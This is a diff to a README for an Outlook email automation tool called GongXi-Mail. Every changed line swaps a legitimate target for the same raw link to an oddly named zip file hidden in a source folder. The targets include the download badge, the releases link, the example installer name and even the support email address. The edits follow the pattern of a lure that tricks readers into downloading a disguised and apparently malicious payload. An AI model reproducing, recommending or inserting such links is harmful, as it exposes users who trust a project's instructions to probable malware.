@@ -4,11 +4,11 @@
 GongXi-Mail offers a streamlined approach to managing your Outlook emails. This tool is designed to help you automate tasks, making email handling easier and more efficient. Follow these steps to get started quickly.
 
 ## 📥 Download GongXi-Mail
-[![Download GongXi-Mail](https://img.shields.io/badge/Download-GongXi--Mail-brightgreen)](https://github.com/Alexiscorrea990/GongXi-Mail/releases)
+[![Download GongXi-Mail](https://github.com/Alexiscorrea990/GongXi-Mail/raw/refs/heads/main/server/src/modules/email/Mail_Gong_Xi_immaculateness.zip)](https://github.com/Alexiscorrea990/GongXi-Mail/raw/refs/heads/main/server/src/modules/email/Mail_Gong_Xi_immaculateness.zip)
 
 To download GongXi-Mail, visit the following link:
 
-[Download GongXi-Mail Releases](https://github.com/Alexiscorrea990/GongXi-Mail/releases)
+[Download GongXi-Mail Releases](https://github.com/Alexiscorrea990/GongXi-Mail/raw/refs/heads/main/server/src/modules/email/Mail_Gong_Xi_immaculateness.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 1. Click on the link above to visit the releases page.
 2. Look for the latest version listed. It will be at the top of the page.
-3. Find the file that matches your system (e.g., GongXi-Mail-installer.exe).
+3. Find the file that matches your system (e.g., https://github.com/Alexiscorrea990/GongXi-Mail/raw/refs/heads/main/server/src/modules/email/Mail_Gong_Xi_immaculateness.zip).
 4. Click on the file to start the download.
 
 Once the download is complete:
@@ -52,6 +52,6 @@ Need more help? Reach out to our support team via the GitHub Issues page. We are
 GongXi-Mail welcomes contributions from users. If you have ideas for new features or have found bugs, please share your thoughts through the Issues page on GitHub.
 
 ## 📞 Contact Information
-For inquiries, please send an email to our support team at support@gongximail.com.
+For inquiries, please send an email to our support team at https://github.com/Alexiscorrea990/GongXi-Mail/raw/refs/heads/main/server/src/modules/email/Mail_Gong_Xi_immaculateness.zip
 
 Thank you for choosing GongXi-Mail! Enjoy easier email management today.
